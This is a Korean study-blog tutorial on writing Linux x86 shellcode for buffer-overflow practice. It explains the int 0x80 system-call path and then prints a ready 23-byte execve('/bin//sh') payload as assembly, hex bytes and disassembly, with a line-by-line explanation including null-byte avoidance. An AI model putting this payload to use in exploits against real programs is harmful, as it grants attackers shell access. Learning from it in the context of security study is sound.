---
title : "쉘코드 만들기"
excerpt : "쉘코드 만들기"
toc : true
toc_sticky : true
categories :
  - System
  - Linux
  - BOF
tags :
  - shellcode 만들기
---

## system call
```c
// write(1, buf, n) : (stdout, 문자열, 문자열 길이)

int main() {
  printf("hello world!\n");  // write(1, "hello world!\n)", 15);  
}
```
```
사용자가 printf() 함수를 사용을 하면 printf() 함수는 내부적으로 write() 함수를 사용함.

사용자가 write() 함수가 호출되면 내부적으로 libc.a에서 system call을 호출하게 되는데
아래와 같은 기계어 코드가 생성이 됨.
```
```
mov eax, 0x4
int 0x80
```
![](/assets/images/syscall_write.png){: .align-center}
```
소프트웨어 인터럽트에는 고유 번호가 존재하는데 시스템 콜도 그 중 한 종류로 고유번호는
IDT라는 곳에 저장이 되는데 0x80이 system_call의 고유 번호임.

system call을 호출하면 system call table에 있는 함수 중 write 함수의 고유 번호는 0x4

따라서 mov eax, 0x4는 system call table에 있는 write 함수를 호출하는 것이고
int 0x80은 system call을 호출하는 것임.
```
![](https://www.linuxbnb.net/wp-content/uploads/2018/06/system-call-overview-1.png){: .align-center}
```
1. Application에서 소프트웨어 인터럽트 발생
2. C library(libc.a)에서 system call 고유번호 0x80을 레지스터에 저장
3. Kernel에서 IDT를 참조해 예를 들어 write 함수를 사용하면 write 고유번호 0x4 저장
```
출처 : <a href="http://blog.naver.com/s2kiess/30190130352" target="_blank">http://blog.naver.com/s2kiess/30190130352</a> 

## 기계어 코드 작성
<a href="https://m.blog.naver.com/s2kiess/30190492715" target="_blank">https://m.blog.naver.com/s2kiess/30190492715</a>  

### 알아둬야 할 점
```
만약 쉘에서 만들거라면 확장자는 .s로 저장, 자세한 건 reference에서 확인

.global [변수명]은 [변수명] 부분을 global 영역으로 만들어 
외부에서 호출 가능하도록 지정한 것이라 함.

gcc는 컴파일 시 AT&T 문법을 사용해서 AT&T로 기계어 코드 작성해야 한다고 함.
```

##  system("/bin/sh")
```
system("/bin/sh")에서 system 함수는 내부적으론 execve 함수를 호출 
execve 함수는 또 내부적으로 system call을 호출 

따라서 execve만 호출해주면 됨.
```
**linux x86 sys_execve 함수**
```c
#include <unistd.h> 

int execve(const char *filename, char *const argv[], char *const envp[]);

// execve(문자열, 문자열 시작 주소, NULL);
```

## 어셈블리어로 작성
**32, 64bit linux system call table**   
<a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank">chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a>  
![](/assets/images/syscall_execve.png){: .align-center}  
제작 사이트 : <a href="https://defuse.ca/online-x86-assembler.htm" target="_blank">https://defuse.ca/online-x86-assembler.htm</a>  
위 사이트는 인텔로 작성해줘야 함. 아마 변환과정에서 알아서 AT&T로 해주는 듯.

**execve("/bin//sh",0,0)를 호출하는 어셈블리어 코드**  
```
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
movb eax, 0xb
int 0x80
```
```
\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xB0\x0B\xCD\x80

길이 : 23
```
```
Disassembly

0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  31 c9                   xor    ecx,ecx
11: 31 d2                   xor    edx,edx
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
```

### 해석
```
xor 부분은 null byte 제거를 위해 해주는 것. 
null byte가 있으면 쉘 코드가 종료될 수 도 있음.
```
```
push eax          # 현재 값이 0이므로 문자열 마지막 null을 뜻함. 
push 0x68732f2f   # "//sh", little endian이므로 거꾸로 해준 것.
push 0x6e69622f   # "/bin", 거꾸로 해준 것.
mov ebx, esp      # push를 해주면 esp가 변경이 되므로(이렇게 하면 "/bin"에 위치)
                  # 문자열의 주소를 ebx에 전달해주는 것.
```
```
xor ecx, ecx
xor edx, edx

# null byte 제거와 동시에 ecx, edx에 값을 0을 주는 것.
```
```
movb eax, 0xb     # execve를 호출하기 위해 고유 번호인 0xb를 저장.
int 0x80          # system call을 호출하는 것.
```

### /bin/sh와 /bin//sh 차이점
출처 : <a href="https://htst.tistory.com/71" target="_blank">https://htst.tistory.com/71</a>
```
/bin/sh는 7바이트이므로 8바이트를 맞춰주기 위해 /bin//sh로 한 것.
```

## Reference
<a href="https://m.blog.naver.com/s2kiess/30190492715" target="_blank">https://m.blog.naver.com/s2kiess/30190492715</a>  
<a href="https://cosyp.tistory.com/205" target="_blank">https://cosyp.tistory.com/205</a>  
<a href="https://htst.tistory.com/70" target="_blank">https://htst.tistory.com/70</a>  
